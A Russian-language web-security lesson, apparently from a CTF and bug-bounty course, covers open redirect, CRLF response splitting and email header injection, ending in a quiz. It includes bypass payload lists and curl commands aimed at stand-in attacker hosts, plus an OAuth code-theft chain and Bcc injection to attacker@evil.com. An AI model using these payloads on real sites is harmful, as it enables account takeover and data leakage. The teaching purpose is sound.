---
id: web-open-redirect-crlf
title: "Open Redirect, CRLF-инъекция и заголовочные атаки"
category: web
parent: web-xss-client-side
difficulty: medium
order: 1
tags: [open-redirect, crlf, header-injection, email-injection, response-splitting]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 34
summary: "Подмена редиректа, вставка переводов строк в заголовки и письма — и как это усиливает XSS и SSRF."
---

Иногда уязвимость сама по себе «низкая», но её комбинация с другой даёт критичный результат. Open Redirect, CRLF-инъекция и инъекция в заголовки email — как раз такие «усилители»: сами по себе они могут быть Medium, но в цепочке с OAuth или XSS превращаются в захват аккаунта. Здесь разберём все три.

## Теория: Open Redirect

**Open Redirect** — когда параметр с URL редиректа не валидируется:

```
GET /login?next=https://evil.com   ->  302 Location: https://evil.com
```

Приложения часто используют `next`/`url`/`redirect`/`return`/`continue`/`callback`. Сам по себе open redirect — Medium, но:

- **OAuth:** если `redirect_uri` доверяет приложению с open redirect, токен/код уводится через цепочку.
- **Фишинг:** доверенный домен в ссылке повышает доверие.
- **CSRF:** open redirect на том же домене позволяет обойти проверку `Referer`/`Origin`.

Техники обхода валидации:

```
https://evil.com
//evil.com
https://target.local.evil.com
https://evil.com#target.local
https://target.local/redirect?url=https://evil.com
https://evil.com\target.local
http://evil.com (смена схемы)
https:evil.com
//target.local@evil.com
```

## Теория: CRLF-инъекция (HTTP Response Splitting)

Если ввод попадает в **заголовок ответа** (например, `Location`), а приложение не фильтрует `\r\n`, вы можете добавить свои заголовки или даже тело:

```
/redirect?url=https://x%0d%0aSet-Cookie:admin=1
```

`%0d%0a` = CRLF. Результат — сервер отдаёт:

```
Location: https://x
Set-Cookie: admin=1
```

Это **CRLF injection / HTTP response splitting**. Варианты: `%0a` (LF), `%0d` (CR), `%0d%0a`, двойное кодирование `%250d%250a`. Последствия: cookie injection (session fixation), XSS (если после CRLF вставить `\r\n\r\n<script>`), кэш-poisoning (см. `web-cache-poisoning`).

## Теория: Email Header Injection

Если приложение формирует письмо, вставляя ваш ввод в заголовки (например, имя в поле `From`/`Subject`), `\r\n` позволяет добавить **свои заголовки**:

```
Name: test\r\nBcc: attacker@evil.com
```

Результат — письмо уходит скрытой копией атакующему (утечка содержимого) или рассылка спама через доверенный домен. Также инъекция в `To`/`Reply-To`.

## Инструменты: curl и декодирование

Проверить редирект, не следуя за ним:

```bash
curl -s -i 'https://target.local/login?next=https://evil.com' | grep -i '^location'
```

Проверить CRLF (кодируем `\r\n` в URL):

```bash
curl -s -i 'https://target.local/redirect?url=https://x%0d%0aX-Injected:yes'
```

Смотрим, появился ли заголовок `X-Injected: yes` в ответе.

Декодировать/кодировать:

```bash
python3 -c "import urllib.parse as u; print(u.quote('a\r\nb'))"
```

В **Burp** удобно смотреть «сырой» ответ Repeater — новые заголовки видны сразу.

## Разобранный пример: open redirect → обход OAuth redirect_uri

Шаг 1. Находим open redirect:

```bash
curl -s -i 'https://app.target.local/out?url=https://evil.com' | grep -i '^location'
# Location: https://evil.com   <-- open redirect
```

Шаг 2. Замечаем, что OAuth-провайдер доверяет домену `app.target.local`. Строим `redirect_uri` через open redirect:

```
https://idp.target.local/authorize?client_id=app&redirect_uri=https://app.target.local/out%3Furl%3Dhttps://evil.com&response_type=code
```

Шаг 3. Провайдер видит доверенный `redirect_uri` (`app.target.local`), редиректит туда с `code`, а приложение перекидывает на `evil.com` — код утекает. Цепочка: open redirect + слабая валидация redirect_uri = захват аккаунта.

## Разобранный пример: CRLF → session fixation

Шаг 1. Проверяем инъекцию:

```bash
curl -s -i 'https://app.local/r?u=%0d%0aSet-Cookie:SID=attacker'
```

Ответ:

```
HTTP/1.1 302 Found
Location: 
Set-Cookie: SID=attacker
```

Шаг 2. Теперь можно навязать жертве известный `SID` (session fixation, см. `web-cookies-sessions`). Если сервер не ротирует сессию после логина — захват аккаунта.

Шаг 3. Вариант XSS: `%0d%0a%0d%0a<script>alert(1)</script>` — тело ответа начинается с вашего скрипта.

## Разобранный пример: email header injection

Шаг 1. Форма «связаться» принимает `name` и `message`. Пробуем:

```
name = test%0d%0aBcc:attacker@evil.com
```

Шаг 2. Если приложение не фильтрует, письмо уйдёт с вашим `Bcc` → вы получаете копию всех писем. Это утечка и спам-вектор.

## Частые ошибки

- **Недооценивать open redirect.** Сам по себе Medium, но в OAuth-цепочке — Critical. Всегда ищите, где он «усиливает».
- **Пробовать только `https://evil.com`.** Обходы (`//evil.com`, `@`, `#`, tab, смена схемы) часто проходят.
- **Забывать про кодирование.** CRLF нужно кодировать (`%0d%0a`), иногда дважды.
- **Путать CRLF в запросе и в ответе.** Инъекция опасна, когда ввод попадает в **заголовки ответа**.
- **Игнорировать email.** Инъекция в заголовки письма — частая находка в контактных формах.
- **Тестировать спамом.** Не рассылайте письма массово; используйте свой ящик для проверки.

## Полный арсенал payload'ов для open redirect

Обход валидации redirect-параметра — отдельное искусство. Держите под рукой набор.

```text
//attacker.com               # scheme-relative
https:/attacker.com         # один слэш
https:///attacker.com       # три слэша
https://attacker.com\@allowed.com
https://allowed.com@attacker.com
https://allowed.com.attacker.com
https://allowed.com%09.attacker.com
\/\/attacker.com
https:attacker.com
https://attacker.com#allowed.com
https://attacker.com?allowed.com
//attacker.com/%2f..%2f
%0d%0aLocation:%20https://attacker.com
```

```bash
# проверяем редирект без следования за ним
curl -s -o /dev/null -w '%{redirect_url}\n' \
  'https://app.example/redirect?next=//attacker.com'
# если вывод содержит attacker.com -> open redirect
```

## Валидация redirect: типичные ошибки и обходы

| Проверка | Ошибка | Обход |
|----------|--------|-------|
| `startswith('https://allowed.com')` | суффикс не проверен | `https://allowed.com.attacker.com` |
| `contains('allowed.com')` | подстрока | `https://attacker.com/?allowed.com` |
| regex без якорей | частичное совпадение | `https://xallowed.com` |
| проверка только домена | игнор пути | `allowed.com/../../` |
| allowlist по схеме | нет проверки хоста | `https://attacker.com` |
| декодирование после проверки | двойное кодирование | `%2f%2fattacker.com` |

Ключевое правило: валидируйте **после** полного декодирования и нормализации, сравнивая разобранный хост, а не строку.

## CRLF-инъекция: HTTP Response Splitting

Если ввод попадает в заголовок ответа (`Location`, `Set-Cookie`, кастомный) без фильтрации `\r\n`, можно вставить свои заголовки и даже тело.

```bash
# 1) вставка произвольного заголовка
curl -s 'https://app.example/lang?x=%0d%0aSet-Cookie:%20admin=1'
# 2) подмена тела ответа (response splitting)
curl -s 'https://app.example/lang?x=%0d%0a%0d%0a<script>alert(1)</script>'
# 3) вставка нескольких заголовков
curl -s 'https://app.example/lang?x=%0d%0aContent-Length:%200%0d%0a%0d%0a'
```

Признак уязвимости — появление ваших заголовков в ответе. Фильтр обычно режет `\r\n`, но пропускает `%0d%0a`, `\r\n` в разных кодировках или `\u000d\u000a`.

## Email Header Injection

Если пользовательский ввод попадает в заголовки письма (`To`, `Subject`, `Cc`), можно добавлять получателей и подменять тело.

```bash
# добавляем скрытого получателя
curl -s -X POST https://app.example/feedback \
  --data-urlencode 'email=victim@x.com%0aCc:attacker@evil.com' \
  --data 'message=hi'
# подменяем тело письма
curl -s -X POST https://app.example/feedback \
  --data-urlencode $'email=a@x.com%0d%0a%0d%0aPhishing body'
```

Риски: рассылка спама от имени домена, фишинг, утечка данных через `Bcc`.

## Разобранный пример: open redirect → обход OAuth redirect_uri

Цепочка: OAuth-сервер строго проверяет `redirect_uri`, но в приложении есть открытый редирект.

```text
# redirect_uri разрешён строго: https://app.example/cb
# но /cb?next=... не проверяет next
https://auth.example/authorize?client_id=app\
&redirect_uri=https://app.example/cb?next=https://attacker.example\
&response_type=code&scope=openid
# код авторизации уходит на app.example/cb, который редиректит на attacker
```

Атакующий получает `code` и обменивает его на токен. Именно так open redirect превращается в захват аккаунта.

## Что делать дальше / решение

1. **Найдите redirect-параметры.** `next`, `url`, `return`, `continue`, `redirect`, `dest`.
2. **Проверьте реакцию.** Смотрите `Location` в ответе (`%{redirect_url}`).
3. **Переберите payload'ы.** Из списка выше, включая кодировки.
4. **Проверьте CRLF.** Вставка `%0d%0a` в параметр, идущий в заголовок.
5. **Проверьте email-заголовки.** Формы обратной связи, приглашения.
6. **Оцените цепочку.** Open redirect + OAuth = захват аккаунта; зафиксируйте PoC.

## Практика и справочники

- **PortSwigger Academy** — «Open redirection», «HTTP response splitting».
- **HackTricks** — «Open Redirect», «CRLF Injection».
- **PayloadsAllTheThings** — «Open Redirect», «CRLF Injection».
- **OWASP WSTG** — `WSTG-CLNT-04`.

## Расширенный список обходов (с кодировками)

Полезно иметь таблицу «валидация → обход» под рукой:

| Валидация | Обход | Пояснение |
|-----------|-------|-----------|
| `startsWith('https://allowed.com/')` | `https://allowed.com@attacker.com` | userinfo |
| `includes('allowed.com')` | `https://attacker.com/allowed.com` | путь |
| `host === 'allowed.com'` | `https://allowed.com.attacker.com` | поддомен |
| блок `/` в начале | `\/\/attacker.com` | backslash |
| блок `//` | `https:/attacker.com` | один слэш |
| декодирование после проверки | `%252f%252fattacker.com` | двойное кодирование |
| проверка только схемы | `https:attacker.com` | схема без `//` |
| нормализация пути | `https://attacker.com/../` | dot-segments |

```bash
# прогон всех вариантов и печать Location
while read u; do
  printf '%-45s -> ' "$u"
  curl -s -o /dev/null -w '%{redirect_url}\n' \
    "https://app.example/go?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$u")"
done < payloads.txt
```

Автоматизация через `ffuf` с `-mr` по домену атакующего быстро выявляет рабочий вариант.

## Что делать дальше / решение (кратко)

1. Соберите все redirect/return-параметры (`grep` по JS и HTML).
2. Проверьте `Location` в ответе, а не финальную страницу.
3. Переберите таблицу обходов и кодировок.
4. Проверьте CRLF и email-заголовки отдельно.
5. Оцените цепочку (OAuth/SSO) и оформите PoC.

## Практика

- **PortSwigger Academy** — лаборатории Open redirection (1–4).
- **PayloadsAllTheThings** — `Open Redirect` + `CRLF Injection`.
- **HackTricks** — `Open Redirect`.

## Быстрый чек-лист open redirect / CRLF

| Шаг | Проверка | Ожидаемый признак |
|-----|----------|-------------------|
| 1 | найти redirect-параметр | `next`/`url`/`return`/`dest` |
| 2 | внешний домен | `Location: //attacker.com` |
| 3 | кодировки | `%2f%2f`, двойное кодирование |
| 4 | userinfo/subdomain | `allowed.com@attacker.com` |
| 5 | CRLF | `%0d%0a` в ответе |
| 6 | цепочка OAuth | кража `code` |

Шесть строк — минимальный аудит; найденный рабочий редирект оформляется PoC с полным URL и заголовком `Location`.

## Почему это важно на практике

Open redirect сам по себе часто считают «низким» риском, но в цепочке он превращается в захват аккаунта: OAuth/SSO доверяют `redirect_uri`, а приложение-получатель редиректит дальше по непроверенному параметру. CRLF-инъекция, в свою очередь, позволяет вставить произвольные заголовки ответа — вплоть до подмены `Set-Cookie` и разделения HTTP-ответа. Обе техники дешёвы в проверке (один `curl`) и хорошо документируются, поэтому их стоит включать в стандартный чек-лист каждого веб-теста и фиксировать даже при «низкой» отдельной критичности — как звено более серьёзной атаки.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое open redirect?"
  options:
    - "Редирект на произвольный внешний URL через параметр без валидации"
    - "Редирект на 404"
    - "Внутренний роутинг SPA"
    - "Кэширование редиректов"
  answer: 0
  explanation: "Параметр `next`/`url` управляет `Location` без проверки."
- question: "Какие символы используются для CRLF-инъекции?"
  options:
    - "`\t\n`"
    - "`\r\n` (кодируются как `%0d%0a`)"
    - "`\0`"
    - "`%20`"
  answer: 1
  explanation: "CR (`\r`) + LF (`\n`) завершают строку заголовка."
- question: "К чему приводит HTTP response splitting?"
  options:
    - "К утечке TLS-ключа"
    - "К добавлению своих заголовков/тела (cookie injection, XSS, cache poisoning)"
    - "К SQL-инъекции"
    - "К отказу DNS"
  answer: 1
  explanation: "Вставив CRLF, вы добавляете заголовки или тело ответа."
- question: "Как email header injection может привести к утечке?"
  options:
    - "Через шифрование письма"
    - "Через добавление `Bcc: attacker@evil.com`"
    - "Через смену темы"
    - "Через вложение"
  answer: 1
  explanation: "Инъекция `Bcc` отправляет копию письма атакующему."
- question: "Почему open redirect усиливает OAuth-атаки?"
  options:
    - "Он ускоряет обмен кода"
    - "Доверенный `redirect_uri` можно превратить в переадресацию на домен атакующего, украв код"
    - "Он шифрует токен"
    - "Он отключает state"
  answer: 1
  explanation: "Провайдер доверяет домену, а тот редиректит на `evil.com`."
```

## Где пригодится

- **CTF (Web):** цепочки «open redirect → OAuth» и CRLF → XSS — частые сюжеты задач.
- **Bug bounty:** open redirect на OAuth-домене, CRLF, email injection — валидные находки разного уровня.
- **Пентест:** проверка редиректов и инъекций в заголовки — обязательный пункт веб-тестирования.
- **Работа (AppSec/Dev):** whitelist редиректов и фильтрация CRLF — базовая защита, которую вы будете проверять в коде.
